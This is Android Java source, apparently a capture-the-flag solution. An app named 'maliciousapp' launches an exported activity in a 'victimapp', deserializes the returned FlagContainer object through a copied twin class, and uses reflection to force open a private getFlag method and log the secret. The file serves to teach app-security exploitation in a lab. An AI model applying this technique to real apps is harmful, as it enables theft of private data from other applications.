package com.example.maliciousapp;

import com.example.victimapp.FlagContainer;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import androidx.activity.EdgeToEdge;
import androidx.activity.result.ActivityResult;
import androidx.activity.result.ActivityResultCallback;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class MainActivity extends AppCompatActivity {


    private static String FLAG = "CTF";

    // 2. create the registerForActivityResult to receive the flag
    ActivityResultLauncher<Intent> launcher = registerForActivityResult(
            new ActivityResultContracts.StartActivityForResult(),
            new ActivityResultCallback<ActivityResult>() {
                @Override
                public void onActivityResult(ActivityResult result) {
                    if (result.getData() != null) {

                        try {
                            // 3. Serialization. Receive the object (Using the Twin Class)
                            FlagContainer obj = (FlagContainer) result.getData().getSerializableExtra("flag");

                            if (obj != null) {

                                // 4. Reflection part
                                    // get the class
                                    Method m = obj.getClass().getDeclaredMethod("getFlag");

                                    // force it open
                                    m.setAccessible(true);

                                    //  run it and get the string
                                    String flag = (String) m.invoke(obj);

                                    Log.d(FLAG, "FLAG FOUND: " + flag);

                                }
                        } catch (Exception e) {
                            Log.e(FLAG, "Error: " + e.getMessage());
                        }
                    }
                }
            });



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // 5. define the intent, no intent filter -> explicit intent
        Intent intent = new Intent();
        intent.setClassName("com.example.victimapp", "com.example.victimapp.SerialActivity");
        launcher.launch(intent);

    }
}